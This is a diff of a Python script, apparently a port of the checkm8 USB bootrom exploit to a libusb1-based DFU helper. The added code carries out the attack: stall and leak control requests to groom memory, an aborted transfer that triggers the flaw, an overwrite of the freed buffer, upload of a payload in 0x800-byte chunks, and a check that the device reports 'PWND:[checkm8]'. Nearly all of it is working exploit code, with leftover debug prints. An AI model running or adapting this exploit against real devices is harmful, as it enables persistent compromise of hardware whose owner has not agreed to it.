@@ -1,14 +1,46 @@
-from calendar import day_abbr
-from operator import ne
-import usb1, struct, time, array, sys
-import newDFU
+import usb1, struct, time, array, sys, ctypes
+import dfu
 
 # Must be global so garbage collector never frees it
 request = None
 transfer_ptr = None
 never_free_device = None
 
-def no_error_ctrl_transfer(
+# The following two functions are taken from PyUSB to help with control transfers
+
+# this is used (as of May 2015) twice in core, once in backend/openusb, and in
+# some unit test code. It would probably be clearer if written in terms of some
+# definite 3.2+ API (bytearrays?) with a fallback provided for 2.4+.
+def as_array(data=None):
+    if data is None:
+        return array.array('B')
+
+    if isinstance(data, array.array):
+        return data
+
+    try:
+        return array.array('B', data)
+    except TypeError:
+        # When you pass a unicode string or a character sequence,
+        # you get a TypeError if the first parameter does not match
+        a = array.array('B')
+        a.fromstring(data) # deprecated since 3.2
+        return a
+
+def create_buffer(length):
+    r"""Create a buffer to be passed to a read function.
+
+    A read function may receive an out buffer so the data
+    is read inplace and the object can be reused, avoiding
+    the overhead of creating a new object at each new read
+    call. This function creates a compatible sequence buffer
+    of the given length.
+    """
+    # For compatibility between Python 2 and 3
+    _dummy_s = b'\x00'.encode('utf-8')
+    return array.array('B', _dummy_s * length)
+
+def ctrl_transfer(
     device: usb1.USBDeviceHandle,
     bmRequestType: int,
     bRequest: int,
@@ -18,12 +50,28 @@ def no_error_ctrl_transfer(
     timeout: float = None):
 
     print(f"type of data_or_wLength: {type(data_or_wLength)}")
+    print(f"data_or_wLength: {data_or_wLength}")
+
+    try:
+        print('type: ' + type(data_or_wLength).__name__)
+        buff = create_buffer(data_or_wLength)
+    except TypeError:
+        print('TypeError')
+        print('type: ' + type(data_or_wLength).__name__)
+        buff = as_array(data_or_wLength)
     
-    if type(data_or_wLength) is not int:
+    if data_or_wLength == 0:
       print(type(data_or_wLength))
-      r = device.controlWrite(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
-    else:
       r = device.controlRead(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
+    else:
+      
+      if type(data_or_wLength) == int:
+        print(f"type of buff: {type(buff)}")
+        print(f"buff: {buff}")
+        device.controlWrite(bmRequestType, bRequest, wValue, wIndex, buff, timeout)
+      else:
+        r = device.controlWrite(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
+      
     
 
 def async_ctrl_transfer(
@@ -47,9 +95,10 @@ def async_ctrl_transfer(
   )
   transfer_ptr = device.getTransfer(len(request))
   transfer_ptr.setControl(bm_request_type, b_request, w_value, w_index, data)
-  transfer_ptr.submit()
+  res = transfer_ptr.submit()
+  print(f"res: {res}")
 
-  while time.time() - start < timeout / 1000.0:
+  while time.time() - start < timeout / 1000.00:
       pass
 
   transfer_ptr.cancel()
@@ -210,16 +259,16 @@ def exploit_config(serial_number):
   sys.exit(1)
 
 def stall(device: usb1.USBDeviceHandle):  async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0x10, 0.00001)
-def leak(device: usb1.USBDeviceHandle):    no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
-def no_leak(device: usb1.USBDeviceHandle): no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
+def leak(device: usb1.USBDeviceHandle):    ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
+def no_leak(device: usb1.USBDeviceHandle): ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
 
-def usb_req_stall(device: usb1.USBDeviceHandle):   no_error_ctrl_transfer(device, 0x2, 3,   0x0,  0x80,  0x0, 10)
-def usb_req_leak(device: usb1.USBDeviceHandle):    no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
-def usb_req_no_leak(device: usb1.USBDeviceHandle): no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)
+def usb_req_stall(device: usb1.USBDeviceHandle):   ctrl_transfer(device, 0x2, 3, 0x0,  0x80,  0x0, 10)
+def usb_req_leak(device: usb1.USBDeviceHandle):    ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
+def usb_req_no_leak(device: usb1.USBDeviceHandle): ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)
 
 context = usb1.USBContext()
 
-device = newDFU.acquire_device()
+device = dfu.acquire_device()
 
 if type(device) is not usb1.USBDeviceHandle:
   print("Error opening USB device. Exiting.")
@@ -231,7 +280,7 @@ if 'PWND:[' in device.getSerialNumber():
   sys.exit(0)
 payload, config = exploit_config(device.getSerialNumber())
 
-
+start = time.time()
 
 
 print("*** checkm8 exploit by axi0mx ***")
@@ -248,13 +297,13 @@ else:
     no_leak(device)
   usb_req_leak(device)
   no_leak(device)
-newDFU.release_device(device, )
+dfu.release_device(device)
 
 
 print("****** stage 2, usb setup, send 0x800 of 'A', sends no data")
-device = newDFU.acquire_device()
-async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
-print("0x800 of 'A' sent")
+device = dfu.acquire_device()
+while(async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 10)):
+  print("Sent")
 
 # LIBUSB_ERROR_IO - input/output error
 
@@ -269,8 +318,37 @@ print("0x800 of 'A' sent")
 # DFU_GETSTATE - 0x05
 # DFU_ABORT - 0x06
 
-no_error_ctrl_transfer(device, 0x21, 0x04, 0, 0, 0, 1)
-print("Test done")
-newDFU.release_device(device)
+#ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
+dfu.release_device(device)
+print("Go")
+time.sleep(5)
+device = dfu.acquire_device()
+ctrl_transfer(device, 0x21, 0x4, 0, 0, 0, 0)
+print("ctrl_transfer done")
+dfu.release_device(device)
 
 print("Stage 2 finished")
+
+time.sleep(0.5)
+
+device = dfu.acquire_device()
+usb_req_stall(device)
+if config.large_leak is not None:
+  usb_req_leak(device)
+else:
+  for i in range(config.leak):
+    usb_req_leak(device)
+ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
+for i in range(0, len(payload), 0x800):
+  ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
+device.resetDevice()
+dfu.release_device(device)
+
+
+device = dfu.acquire_device()
+if 'PWND:[checkm8]' not in device.serial_number:
+  print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
+  sys.exit(1)
+print ('Device is now in pwned DFU Mode.')
+print('(%0.2f seconds)' % (time.time() - start))
+dfu.release_device(device)
